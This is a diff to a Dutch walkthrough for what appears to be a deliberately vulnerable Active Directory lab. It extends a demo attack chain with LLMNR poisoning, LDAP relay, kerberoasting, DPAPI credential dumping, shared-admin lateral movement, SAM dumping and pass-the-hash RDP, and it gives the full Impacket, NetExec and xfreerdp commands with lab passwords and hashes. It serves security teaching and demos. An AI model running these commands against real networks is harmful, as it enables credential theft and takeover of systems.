@@ -6,11 +6,11 @@ Demo-scenario's die meerdere kwetsbaarheden combineren tot een realistische aanv
 
 ---
 
-## Chain 1: Poisoning → Relay → Kerberoast → Local Admin (aanbevolen demo)
+## Chain 1: Poisoning → Relay → Kerberoast → DPAPI → Pivot (aanbevolen demo)
 
-`06 (Responder poisoning) → relay naar LDAP (domain dump) → 07 (saul's wachtwoord in description) → 08 (kerberoast hector) → hector is local admin op srv01`
+`06 (Responder poisoning) → relay naar LDAP (domain dump) → 07 (saul's wachtwoord in description) → 08 (kerberoast hector) → hector is local admin op srv01 → DPAPI credential dump → 12 (shared admin pivot naar srv02 & backups) → SAM dump → RDP`
 
-> **Verhaal:** Een aanvaller op het netwerk vangt credentials op via LLMNR/NBT-NS poisoning. In plaats van de hash te kraken, wordt de authenticatie direct doorgestuurd (relay) naar de Domain Controller via LDAP. De Domain Controller geeft alle domein-informatie prijs, inclusief het wachtwoord van saul.goodman dat in zijn description-veld staat. Met saul's account wordt een Kerberos-ticket opgevraagd voor hector.salamanca (kerberoasting). Na het kraken van dit ticket blijkt hector local administrator te zijn op srv01, wat directe toegang geeft tot de server. De hash van walter.white kan achteraf alsnog gekraakt worden als extra bewijs.
+> **Verhaal:** Een aanvaller op het netwerk vangt credentials op via LLMNR/NBT-NS poisoning. In plaats van de hash te kraken, wordt de authenticatie direct doorgestuurd (relay) naar de Domain Controller via LDAP. De Domain Controller geeft alle domein-informatie prijs, inclusief het wachtwoord van saul.goodman dat in zijn description-veld staat. Met saul's account wordt een Kerberos-ticket opgevraagd voor hector.salamanca (kerberoasting). Na het kraken van dit ticket blijkt hector local administrator te zijn op srv01, wat directe toegang geeft tot de server. Op srv01 worden via DPAPI opgeslagen credentials gedumpt: het wachtwoord van svc_admin uit een scheduled task genaamd "Backup to 192.168.100.149". Dit onthult zowel een credential als een nieuw doelwit. Omdat svc_admin een shared local admin is (vuln 12), werkt het account ook op srv02 en de backup-server. Op de backup-server wordt de lokale SAM database gedumpt, wat het administrator-wachtwoord oplevert. Hiermee kan de aanvaller via RDP inloggen op de non-domain-joined backup server.
 
 ```bash
 # === Stap 1: Responder + ntlmrelayx (twee terminals) ===
@@ -40,8 +40,17 @@ grep saul /tmp/relay-loot/domain_users.grep
 # Of open de HTML voor een mooiere weergave
 firefox /tmp/relay-loot/domain_users.html
 
-# === Stap 3: Kerberoast hector met saul's credentials ===
+# === Stap 3: Ontdek kerberoastable user & kerberoast ===
 
+# In de LDAP dump staat hector's beschrijving — hint naar service account
+grep hector /tmp/relay-loot/domain_users.grep
+# Output: hector.salamanca ... Serviceaccount webapplicatie srv01
+
+# Enumerate kerberoastable users met saul's credentials
+GetUserSPNs.py breakingbad.local/saul.goodman:"657crsH!" -dc-ip 192.168.100.10
+# Output: hector.salamanca  HTTP/srv01  → bevestigt SPN, kerberoastable!
+
+# Request de TGS hash
 GetUserSPNs.py breakingbad.local/saul.goodman:"657crsH!" -dc-ip 192.168.100.10 \
   -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt
 
@@ -58,6 +67,33 @@ nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" -x 'whoami'
 # Dump SAM, get a shell, etc.
 nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" --sam
 psexec.py breakingbad.local/hector.salamanca:"346modL!"@192.168.100.20
+
+# === Stap 5: DPAPI credential dump op srv01 ===
+
+# Dump DPAPI-beschermde credentials met hector's local admin rechten
+nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" --dpapi
+# Output:
+#   [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{...} - VAGRANT\svc_admin:Zomer123!
+# De scheduled task heet "Backup to 192.168.100.149" → hint naar backup-server
+
+# === Stap 6: Lateral movement via shared admin ===
+
+# svc_admin:Zomer123! is een shared local admin (vuln 12) — werkt ook op srv02
+nxc smb 192.168.100.21 -u svc_admin -p "Zomer123!" --local-auth -x "whoami"
+# Output: (Admin!) srv02\svc_admin
+
+# Pivot naar de non-domain-joined backup server (192.168.100.149)
+nxc smb 192.168.100.149 -u svc_admin -p "Zomer123!" --local-auth -x "hostname"
+# Output: (Admin!) backups\svc_admin
+
+# === Stap 7: SAM dump op backups → Pass-the-Hash → RDP ===
+
+# Dump de lokale SAM database op de backup server
+nxc smb 192.168.100.149 -u svc_admin -p "Zomer123!" --local-auth --sam
+# Output: Administrator:500:aad3b435...:92ccc277d463ed755e4ae47a9cef4943:::
+
+# Pass-the-hash naar RDP als administrator
+xfreerdp /v:192.168.100.149 /u:administrator /pth:92ccc277d463ed755e4ae47a9cef4943 /cert-ignore
 
 # === Bonus: Crack walter.white's hash achteraf ===
 
